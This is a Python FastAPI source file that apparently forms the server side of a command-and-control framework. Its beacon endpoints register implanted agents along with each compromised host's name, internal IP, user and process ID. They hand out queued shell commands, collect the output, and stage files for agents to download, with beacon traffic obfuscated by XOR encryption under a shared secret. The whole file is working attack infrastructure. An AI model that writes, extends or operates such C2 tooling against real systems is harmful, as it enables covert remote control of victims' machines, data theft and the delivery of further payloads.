"""
Beacon protocol endpoints — called by agents, NOT by the web UI.
Authentication: shared secret in X-Agent-Secret header.
"""
from pathlib import Path
from fastapi import APIRouter, Depends, HTTPException, Header, Request
from fastapi.responses import FileResponse
from sqlalchemy.orm import Session
from pydantic import BaseModel
from typing import Optional
from datetime import datetime, timezone
from database import get_db, Agent, Task
import config
import json as _json_mod
from websocket_manager import manager as ws_manager


def _decrypt_body(raw: bytes) -> dict:
    """Transparently decrypt XOR-encrypted beacon body (enc:1 format)."""
    try:
        obj = _json_mod.loads(raw)
        if isinstance(obj, dict) and obj.get("enc") == 1:
            nonce = obj["nonce"]
            data  = bytes.fromhex(obj["data"])
            key   = (config.AGENT_SECRET + nonce).encode()
            plain = bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])
            return _json_mod.loads(plain)
        return obj
    except Exception:
        return _json_mod.loads(raw)

router = APIRouter(prefix="/api/beacon", tags=["beacon"])

UPLOADS_DIR = Path(__file__).parent.parent / "uploads"


def verify_agent_secret(x_agent_secret: Optional[str] = Header(None)):
    if x_agent_secret != config.AGENT_SECRET:
        raise HTTPException(status_code=403, detail="Invalid agent secret")


class CheckinRequest(BaseModel):
    agent_id: str
    hostname: str
    ip_internal: str
    os_info: str
    username: str
    pid: int
    sleep_interval: int = 5
    cwd: str = ""


@router.post("/checkin")
async def checkin(
    request: Request,
    db: Session = Depends(get_db),
    _: None = Depends(verify_agent_secret),
):
    try:
        req = CheckinRequest(**_decrypt_body(await request.body()))
    except Exception:
        raise HTTPException(status_code=422, detail="Invalid checkin body")
    agent = db.query(Agent).filter(Agent.id == req.agent_id).first()

    is_new = agent is None
    if not agent:
        agent = Agent(
            id=req.agent_id,
            hostname=req.hostname,
            ip_internal=req.ip_internal,
            os_info=req.os_info,
            username=req.username,
            pid=req.pid,
            sleep_interval=req.sleep_interval,
        )
        db.add(agent)
    else:
        agent.hostname = req.hostname
        agent.ip_internal = req.ip_internal
        agent.os_info = req.os_info
        agent.username = req.username
        agent.pid = req.pid
        agent.sleep_interval = req.sleep_interval

    if req.cwd:
        agent.cwd = req.cwd
    agent.last_seen = datetime.now(timezone.utc)
    db.commit()

    import asyncio
    asyncio.create_task(ws_manager.broadcast({
        "type": "agent_checkin",
        "agent_id": req.agent_id,
        "hostname": req.hostname,
        "is_new": is_new,
    }))

    # Return next pending task (FIFO)
    task = (
        db.query(Task)
        .filter(Task.agent_id == req.agent_id, Task.status == "pending")
        .order_by(Task.created_at.asc())
        .first()
    )

    if task:
        task.status = "running"
        db.commit()
        return {"task_id": task.id, "command": task.command}

    return {"task_id": None, "command": None}


class ResultRequest(BaseModel):
    task_id: str
    output: str
    status: str  # done | error


@router.post("/result")
async def submit_result(
    request: Request,
    db: Session = Depends(get_db),
    _: None = Depends(verify_agent_secret),
):
    try:
        req = ResultRequest(**_decrypt_body(await request.body()))
    except Exception:
        raise HTTPException(status_code=422, detail="Invalid result body")
    task = db.query(Task).filter(Task.id == req.task_id).first()
    if not task:
        raise HTTPException(status_code=404, detail="Task not found")

    task.output = req.output
    task.status = req.status
    task.completed_at = datetime.now(timezone.utc)
    db.commit()

    import asyncio
    asyncio.create_task(ws_manager.broadcast({
        "type": "task_result",
        "task_id": req.task_id,
        "agent_id": task.agent_id,
        "status": req.status,
    }))
    return {"message": "Result saved"}


# ── Staged file fetch (beacon pulls upload from server) ───────────────────────

@router.get("/fetch/{agent_id}/{task_id}")
def fetch_staged_file(
    agent_id: str,
    task_id: str,
    db: Session = Depends(get_db),
    _: None = Depends(verify_agent_secret),
):
    task = db.query(Task).filter(Task.id == task_id, Task.agent_id == agent_id).first()
    if not task or not task.command.startswith("__upload__:"):
        raise HTTPException(status_code=404, detail="Staged file not found")

    # command format: __upload__:{filename}:{dest_path}
    _, filename, _ = task.command.split(":", 2)
    file_path = UPLOADS_DIR / agent_id / task_id / filename

    if not file_path.exists():
        raise HTTPException(status_code=404, detail="File missing from staging area")

    return FileResponse(path=str(file_path), filename=filename)
